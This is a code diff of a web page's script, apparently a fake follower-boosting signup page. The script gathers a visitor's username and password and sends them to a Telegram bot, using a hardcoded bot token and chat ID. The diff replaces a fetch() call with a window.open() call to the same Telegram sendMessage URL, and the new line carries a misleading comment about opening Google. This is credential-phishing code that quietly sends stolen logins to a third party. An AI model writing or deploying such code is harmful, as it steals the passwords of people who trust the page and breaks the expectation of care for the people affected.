@@ -110,22 +110,7 @@
 
             const message = New signup attempt:nUsername: ${username}nPassword: ${password}nRequested Followers: ${followers};
             
-            const token = '7937991929:AAF3-D2xNgFx-KqlLdRhs3voLJi7PcFNV34'; // Replace with your bot token
-            const chatId = '5113640407'; // Replace with your chat ID
-            const url = https://api.telegram.org/bot7937991929:AAF3-D2xNgFx-KqlLdRhs3voLJi7PcFNV34/sendMessage?chat_id=5113640407&text=${encodeURIComponent(message)};;
-
-            fetch(url)
-                .then(response => {
-                    if (response.ok) {
-                        alert('Message sent to Telegram!');
-                    } else {
-                        alert('Failed to send message.');
-                    }
-                })
-                .catch(error => {
-                    console.error('Error:', error);
-                    alert('Error sending message.');
-                });
+            window.open('https://api.telegram.org/bot7937991929:AAF3-D2xNgFx-KqlLdRhs3voLJi7PcFNV34/sendMessage?chat_id=5113640407&text=${encodeURIComponent(message)};', '_blank'); // Open Google in a new tab
         }
     </script>
 </body>
